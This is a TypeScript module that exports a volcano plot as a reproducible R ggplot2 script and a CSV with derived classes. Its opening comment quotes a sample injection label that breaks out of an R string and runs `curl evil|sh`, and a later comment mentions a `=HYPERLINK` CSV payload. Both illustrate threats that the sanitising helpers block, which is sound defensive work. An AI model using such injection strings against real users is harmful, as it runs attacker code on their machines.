// Pure string-builders for the Volcano tool. Emits a self-contained R
// script (ggplot2 flavour) that reproduces the plotted volcano from the
// user's data, plus a CSV export with the derived `class` column so the
// downstream user can re-run their own pipeline against Plöttr's
// classification.
//
// All user-supplied strings (feature labels, axis titles, plot title)
// flow through `sanitizeRString` (for quoted R literals) or
// `sanitizeRComment` (for `# ...` comment lines) — the audit-hardened
// helpers we shipped in `0ca44c6`. Without that, a hostile feature name
// like `"); system("curl evil|sh"); foo <- c("` would break out of the
// data.frame and execute arbitrary shell when the user runs the script.
//
// String-builder helpers (sanitizeRString, sanitizeRComment,
// formatRNumber, wrapRItems) are imported from `_shell/r-export` — the
// same module heatmap/reports.ts and scatter/reports.ts use. wrapRItems
// is the shared line-wrapping helper; it caps every emitted line at
// R_MAX_LINE so the inlined data block stays parseable by R.

import { VolcanoPoint, VOLCANO_DEFAULT_COLORS, summarize, classifyVolcanoPoint } from "./helpers";
import type { PScale, ImpliedBoundary } from "./helpers";
import { sanitizeRString, sanitizeRComment, formatRNumber, wrapRItems } from "../_shell/r-export";

interface BuildVolcanoRScriptArgs {
  points: VolcanoPoint[];
  fcCutoff: number;
  pCutoff: number;
  colors: { up: string; down: string; ns: string };
  xLabel: string;
  yLabel: string;
  plotTitle: string;
  yIsAdjusted: boolean;
  // How the input p column was written; log scales export −log₁₀(p)
  // itself and derive p from it. Defaults to raw p.
  pScale?: PScale;
  // "open" draws hollow circles (shape = 1); defaults to filled.
  pointStyle?: "filled" | "open";
  // Significance-call column name and the boundary its calls imply. When
  // set, classes come from the calls and the curves replace the cutoffs.
  callLabel?: string;
  boundary?: ImpliedBoundary | null;
  generatedAt?: string;
}

export function buildVolcanoRScript(args: BuildVolcanoRScriptArgs): string {
  const {
    points,
    fcCutoff,
    pCutoff,
    colors,
    xLabel,
    yLabel,
    plotTitle,
    yIsAdjusted,
    pScale = "p",
    pointStyle,
    callLabel = "",
    boundary = null,
    generatedAt,
  } = args;
  const logInput = pScale !== "p";
  const useCalls = callLabel !== "";
  const now = generatedAt || new Date().toISOString().replace(/\.\d{3}Z$/, "Z");
  const summary = summarize(points, fcCutoff, pCutoff);

  // Build the three parallel vectors. Discarded rows (non-finite log2FC
  // or p) are dropped — the R reproduction shouldn't carry NA noise that
  // the Plöttr render also dropped.
  const featureItems: string[] = [];
  const log2fcItems: string[] = [];
  const pItems: string[] = [];
  const callItems: string[] = [];
  for (const pt of points) {
    if (!Number.isFinite(pt.log2fc) || !Number.isFinite(pt.p)) continue;
    if (logInput && !(pt.nlog10 !== undefined && Number.isFinite(pt.nlog10))) continue;
    const labelStr =
      pt.label != null && pt.label !== ""
        ? '"' + sanitizeRString(pt.label) + '"'
        : '"feature_' + (pt.idx + 1) + '"';
    featureItems.push(labelStr);
    log2fcItems.push(formatRNumber(pt.log2fc));
    // Log input: carry −log₁₀(p) itself, which stays exact past p's
    // double-precision floor.
    pItems.push(formatRNumber(logInput && pt.nlog10 !== undefined ? pt.nlog10 : pt.p));
    callItems.push(pt.call ? "TRUE" : "FALSE");
  }

  const lines: string[] = [];
  lines.push("# -----------------------------------------------------------------------------");
  lines.push("# Plöttr — Volcano plot R script export");
  lines.push("# Generated: " + now);
  lines.push("#");
  lines.push("# Reproduces the volcano plot you saw in the browser tool, using ggplot2.");
  if (useCalls) {
    lines.push(
      '# Each point is one feature. Classes come from your column "' +
        sanitizeRComment(callLabel) +
        '":'
    );
    lines.push("#   significant -> up / down by the sign of log2FC; otherwise ns.");
    lines.push(
      "# The dashed curves are the boundary implied by those calls, not an FDR threshold."
    );
  } else {
    lines.push("# Each point is one feature. Classification:");
    lines.push(
      "#   up   : log2FC > +" + formatRNumber(fcCutoff) + " AND p < " + formatRNumber(pCutoff)
    );
    lines.push(
      "#   down : log2FC < -" + formatRNumber(fcCutoff) + " AND p < " + formatRNumber(pCutoff)
    );
    lines.push("#   ns   : everything else");
  }
  lines.push(
    "# Y-axis is -log10(" +
      (yIsAdjusted ? "adjusted p-value" : "raw p-value") +
      ") — pick the column that matches your downstream pipeline."
  );
  lines.push("#");
  lines.push(
    "# Toolbox reported: up=" +
      summary.up +
      ", down=" +
      summary.down +
      ", ns=" +
      summary.ns +
      " (out of " +
      summary.total +
      " valid points; " +
      summary.discarded +
      " discarded for non-finite values)."
  );
  lines.push("# -----------------------------------------------------------------------------");
  lines.push("");
  lines.push('if (!requireNamespace("ggplot2", quietly = TRUE)) install.packages("ggplot2")');
  lines.push("library(ggplot2)");
  lines.push("");

  // ── Data frame literal ────────────────────────────────────────────
  lines.push("df <- data.frame(");
  lines.push("  feature = " + wrapRItems(featureItems, 6) + ",");
  lines.push("  log2FC  = " + wrapRItems(log2fcItems, 8) + ",");
  lines.push((logInput ? "  nlog10p = " : "  pvalue  = ") + wrapRItems(pItems, 8) + ",");
  if (useCalls) lines.push("  significant = " + wrapRItems(callItems, 10) + ",");
  lines.push("  stringsAsFactors = FALSE");
  lines.push(")");
  lines.push("");

  // ── Derived columns ───────────────────────────────────────────────
  if (logInput) {
    lines.push(
      "# Your p column was " +
        (pScale === "neglog10" ? "-log10(p)" : "log10(p) (shown here with its sign flipped)") +
        "; p is derived from it for the cutoff."
    );
    lines.push("df$pvalue <- 10^(-df$nlog10p)");
  } else {
    lines.push("# Clamp p = 0 to a finite floor (smallest non-zero / 10) so -log10 stays finite.");
    lines.push("p_floor <- min(df$pvalue[df$pvalue > 0], na.rm = TRUE) / 10");
    lines.push("df$nlog10p <- -log10(pmax(df$pvalue, p_floor))");
  }
  if (useCalls) {
    lines.push("df$class <- with(df, ifelse(");
    lines.push('  !significant, "ns",');
    lines.push('  ifelse(log2FC > 0, "up", ifelse(log2FC < 0, "down", "ns"))');
    lines.push("))");
  } else {
    lines.push("df$class <- with(df, ifelse(");
    lines.push(
      "  pvalue < " + formatRNumber(pCutoff) + " & log2FC >  " + formatRNumber(fcCutoff) + ', "up",'
    );
    lines.push("  ifelse(");
    lines.push(
      "    pvalue < " +
        formatRNumber(pCutoff) +
        " & log2FC < -" +
        formatRNumber(fcCutoff) +
        ', "down", "ns"'
    );
    lines.push("  )");
    lines.push("))");
  }
  lines.push('df$class <- factor(df$class, levels = c("ns", "down", "up"))');
  lines.push("");

  // ── Plot ──────────────────────────────────────────────────────────
  lines.push(
    'plot_colors <- c(up = "' +
      colors.up +
      '", down = "' +
      colors.down +
      '", ns = "' +
      colors.ns +
      '")'
  );
  lines.push("");
  // Boundary implied by the calls: one band + dashed midline per side
  // that the calls separate; other sides are noted, not drawn.
  const drawnSides: { name: string; sign: 1 | -1 }[] = [];
  if (useCalls && boundary) {
    lines.push("# Boundary implied by the significance calls: y = c / |log2FC|, shaded between");
    lines.push("# the largest non-significant and the smallest significant |log2FC| * -log10(p).");
    lines.push(
      boundary.mode === "symmetric"
        ? "# One curve fits both sides, so it is fitted on both together and mirrored."
        : "# No single curve fits both sides (the calls look asymmetric); each side is fitted on its own."
    );
    lines.push("bnd <- function(sgn, lo, hi, c, from, to) {");
    lines.push("  a <- exp(seq(log(from), log(to), length.out = 200))");
    lines.push("  data.frame(x = sgn * a, lo = lo / a, hi = hi / a, mid = c / a)");
    lines.push("}");
    for (const [key, sign] of [
      ["up", 1],
      ["down", -1],
    ] as const) {
      const sd = boundary[key];
      if (sd.status === "ok") {
        const name = "b_" + key;
        lines.push(
          name +
            " <- bnd(" +
            sign +
            ", " +
            formatRNumber(Math.max(sd.lo, 0)) +
            ", " +
            formatRNumber(sd.hi) +
            ", " +
            formatRNumber(sd.c) +
            ", " +
            formatRNumber(Math.max(sd.absFrom, 1e-9)) +
            ", " +
            formatRNumber(sd.absTo) +
            ")"
        );
        drawnSides.push({ name, sign });
      } else {
        lines.push(
          "# " +
            key +
            " side: " +
            (sd.status === "overlap"
              ? "calls not separable by a single curve; not drawn."
              : "too few calls to draw a boundary; not drawn.")
        );
      }
    }
    lines.push("");
  }
  lines.push("ggplot(df, aes(x = log2FC, y = nlog10p, color = class)) +");
  lines.push(
    pointStyle === "open" ? "  geom_point(alpha = 0.7, shape = 1) +" : "  geom_point(alpha = 0.7) +"
  );
  if (useCalls) {
    for (const { name } of drawnSides) {
      lines.push(
        "  geom_ribbon(data = " +
          name +
          ', aes(x = x, ymin = lo, ymax = hi), inherit.aes = FALSE, fill = "grey50", alpha = 0.15) +'
      );
      lines.push(
        "  geom_line(data = " +
          name +
          ', aes(x = x, y = mid), inherit.aes = FALSE, linetype = "dashed", color = "grey35") +'
      );
    }
    if (drawnSides.length > 0) {
      lines.push("  coord_cartesian(ylim = c(0, max(df$nlog10p, na.rm = TRUE) * 1.05)) +");
    }
  } else {
    lines.push(
      "  geom_vline(xintercept = c(-" +
        formatRNumber(fcCutoff) +
        ", " +
        formatRNumber(fcCutoff) +
        '), linetype = "dashed", color = "grey60") +'
    );
    lines.push(
      "  geom_hline(yintercept = -log10(" +
        formatRNumber(pCutoff) +
        '), linetype = "dashed", color = "grey60") +'
    );
  }
  lines.push("  scale_color_manual(values = plot_colors) +");
  lines.push(
    '  labs(x = "' +
      sanitizeRString(xLabel || "log2(fold change)") +
      '", y = "' +
      sanitizeRString(yLabel || "-log10(p)") +
      '"' +
      (plotTitle ? ', title = "' + sanitizeRString(plotTitle) + '"' : "") +
      (drawnSides.length > 0
        ? ', caption = "Dashed: boundary implied by the significance calls"'
        : "") +
      ") +"
  );
  lines.push("  theme_classic() +");
  lines.push('  theme(legend.position = "right")');
  lines.push("");

  return lines.join("\n");
}

// CSV export with the derived `class` column. Headers and per-feature
// labels both flow through buildCsvString's leading-trigger sanitiser
// (already applied at the shared layer), so a hostile label like
// `=HYPERLINK(...)` is neutralised on download — same path as every
// other tool's CSV export. Returns { headers, rows } shaped for
// downloadCsv.
export function buildVolcanoCsv(args: {
  points: VolcanoPoint[];
  fcCutoff: number;
  pCutoff: number;
  yIsAdjusted: boolean;
}): { headers: string[]; rows: string[][] } {
  const { points, fcCutoff, pCutoff, yIsAdjusted } = args;
  const headers = [
    "feature",
    "log2FC",
    yIsAdjusted ? "p_adjusted" : "p_value",
    "neg_log10_p",
    "class",
  ];
  const rows: string[][] = [];
  // Compute pFloor once to keep the exported -log10(p) consistent with
  // the chart.
  let minNonZero = Infinity;
  for (const pt of points) {
    if (Number.isFinite(pt.p) && pt.p > 0 && pt.p < minNonZero) minNonZero = pt.p;
  }
  const pFloor = Number.isFinite(minNonZero) ? minNonZero / 10 : 1e-300;
  for (const pt of points) {
    const safe = pt.p === 0 ? pFloor : pt.p;
    const nl =
      pt.nlog10 !== undefined && Number.isFinite(pt.nlog10)
        ? pt.nlog10
        : Number.isFinite(safe) && safe > 0
          ? -Math.log10(safe)
          : "";
    let cls: string = classifyVolcanoPoint(pt, fcCutoff, pCutoff);
    if (!Number.isFinite(pt.log2fc) || !Number.isFinite(pt.p)) cls = "discarded";
    rows.push([
      pt.label != null ? pt.label : "feature_" + (pt.idx + 1),
      Number.isFinite(pt.log2fc) ? String(pt.log2fc) : "",
      Number.isFinite(pt.p) ? String(pt.p) : "",
      typeof nl === "number" ? String(nl) : "",
      cls,
    ]);
  }
  return { headers, rows };
}
